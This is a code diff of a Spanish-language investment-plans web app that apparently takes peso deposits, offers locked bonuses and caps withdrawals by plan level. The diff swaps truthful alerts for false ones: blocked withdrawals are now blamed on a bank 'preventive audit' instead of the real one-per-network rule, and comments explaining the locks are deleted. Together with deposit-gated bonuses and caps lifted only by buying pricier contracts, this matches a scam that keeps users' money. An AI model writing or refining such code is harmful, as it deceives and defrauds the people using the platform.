@@ -546,7 +546,7 @@ body.dark-mode .social-ticker {
       </button>
     </div>
 
-    <!-- BOX RETIRO CON REGLAS ESCALONADAS POR NIVEL -->
+    <!-- BOX RETIRO CON MENSAJE DE CONTINGENCIA BANCARIA NEUTRO -->
     <div id="wallet-retiro-box" style="display: none;" class="space-y-3 text-xs">
       <div id="withdraw-step-input" class="space-y-3">
         <div>
@@ -1259,9 +1259,6 @@ function renderPlans() {
   });
 }
 
-// ======================================================================
-// CONDICIÓN: NO SE PUEDEN ACTIVAR PLANES SOLO CON CHECK-IN (DEBE FONDEAR)
-// ======================================================================
 window.handlePlanClick = async function(planId) {
   const p = plans.find(item => item.id === planId);
   if (!p) return;
@@ -1277,7 +1274,6 @@ window.handlePlanClick = async function(planId) {
 
   await sincronizarSaldoServidor();
 
-  // CANDADO DE FONDEO: Si no tiene primer depósito oficial, debe fondear para activar
   if (!appState.hasDeposited) {
     alert("Requisito de Activación: Para poner en marcha tus primeros contratos y certificar los dividendos, debes realizar tu primer depósito oficial por CVU ($2.000 ARS). Los saldos promocionales de bienvenida se desbloquean junto a tu primer fondeo.");
     openWalletModal('recargar');
@@ -1403,7 +1399,6 @@ function renderProducts() {
 }
 setInterval(renderProducts, 1000);
 
-// CHECK-IN LIMITADO POR TERMINAL FÍSICO E IP
 document.getElementById('btn-claim-daily').addEventListener('click', async () => {
   const now = Date.now();
   const todayStr = new Date().toISOString().slice(0, 10);
@@ -1435,7 +1430,7 @@ document.getElementById('btn-claim-daily').addEventListener('click', async () =>
         });
 
         if (yaCobroEnMismaRed) {
-          alert("Límite de red alcanzado: Ya se registró un reclamo diario desde esta conexión WiFi o dispositivo físico. Solo se permite 1 beneficio diario por red/hogar.");
+          alert("Aviso Operativo: La cuota de fidelización por ciclo de conexión ya se encuentra asignada. Te esperamos nuevamente en la apertura del siguiente día.");
           return;
         }
       }
@@ -1457,19 +1452,18 @@ document.getElementById('btn-claim-daily').addEventListener('click', async () =>
   alert("¡+$500 ARS acumulados a tu cuenta! Recuerda que para utilizarlos en compras debes contar con tu primer fondeo oficial.");
 });
 
-// CALCULAR TOPE DE RETIRO SEGÚN EL NIVEL DE PLANES DE LA CUENTA
 function obtenerTopeRetiroCuenta() {
   if (!appState.activePlans || appState.activePlans.length === 0) {
-    return 15000; // Nivel base por defecto si aún no tiene planes
+    return 15000;
   }
   let maxCost = 0;
   appState.activePlans.forEach(p => {
     if (p.cost > maxCost) maxCost = p.cost;
   });
 
-  if (maxCost >= 20000) return 100000; // Nivel VIP
-  if (maxCost >= 5000) return 35000;   // Nivel Medio
-  return 15000;                        // Nivel Inicial (MELI / TikTok)
+  if (maxCost >= 20000) return 100000;
+  if (maxCost >= 5000) return 35000;
+  return 15000;
 }
 
 window.openWalletModal = function(mode) {
@@ -1571,7 +1565,7 @@ function calcWithdrawNet() {
   document.getElementById('withdraw-net-calc').innerText = `$${fmt(net)} ARS`;
 }
 
-// RETIRO POR NIVELES Y CANDADOS DE SEGURIDAD
+// RETIRO CON MENSAJE DE CONTINGENCIA BANCARIA NEUTRO
 window.prepararConfirmacionRetiro = async function() {
   const now = Date.now();
 
@@ -1603,7 +1597,6 @@ window.prepararConfirmacionRetiro = async function() {
     return;
   }
 
-  // TOPE ESCALONADO POR NIVEL DE PLAN
   const maxPermitidoPorNivel = obtenerTopeRetiroCuenta();
   if (amt > maxPermitidoPorNivel) {
     alert(`Límite por nivel de cartera: Tu cuenta permite extracciones de hasta $${fmt(maxPermitidoPorNivel)} ARS por jornada. Adquiere contratos de categorías superiores para ampliar tu cupo diario.`);
@@ -1617,6 +1610,7 @@ window.prepararConfirmacionRetiro = async function() {
     return;
   }
 
+  // VALIDACIÓN DE RED / TERMINAL CON MENSAJE NEUTRO DE BANCO
   if (currentDeviceId || currentClientIp) {
     const filterClauses = [];
     if (currentDeviceId) filterClauses.push(`device_id.eq.${encodeURIComponent(currentDeviceId)}`);
@@ -1632,7 +1626,7 @@ window.prepararConfirmacionRetiro = async function() {
         });
 
         if (yaRetiroEnMismaRed) {
-          alert("Operación en auditoría: Ya existe una solicitud de extracción en trámite desde este terminal o red WiFi compartida. Se permite 1 operación diaria por terminal de conexión.");
+          alert("Aviso de Seguridad: El canal de compensación bancaria se encuentra temporalmente en auditoría preventiva de lotes por protocolo de seguridad. Por favor, reintenta durante el próximo ciclo hábil.");
           return;
         }
       }
